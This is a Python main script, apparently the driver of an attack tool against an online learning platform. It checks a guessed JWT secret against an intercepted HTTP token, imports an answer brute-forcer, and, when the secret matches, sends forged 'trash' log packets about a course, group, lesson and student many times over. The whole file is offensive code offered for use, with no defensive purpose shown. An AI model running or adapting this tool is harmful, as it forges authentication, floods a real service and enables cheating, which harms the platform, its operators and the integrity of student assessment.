from termcolor import colored
from config import COURSE, LESSON, INTERCEPTED_HTTP_PAYLOAD, SECRET, BRUTEFORCE_TIMES, SEND_PACKET_TIMES
from config import LOGS_COURSE, LOGS_LESSON, LOGS_GROUP, LOGS_STUDENT, LOGS_ANSWERS
from jwt_generate import check_secret
from bf_answers import bf_answers_n_times
from trash_logs import send_multiple_times


def main():
    if check_secret(INTERCEPTED_HTTP_PAYLOAD, SECRET):
        print(colored(f'SECRET VERIFY SUCCESSFULLY !!!\n   SECRET: {SECRET}', 'green'))
        send_multiple_times(SEND_PACKET_TIMES, LOGS_COURSE, LOGS_GROUP, LOGS_LESSON, LOGS_ANSWERS, SECRET, LOGS_STUDENT)
    else:
        print(colored(f'WARNING, WRONG SECRET!!!\n   SECRET: {SECRET}', 'red'))


if __name__ == "__main__":
    main()
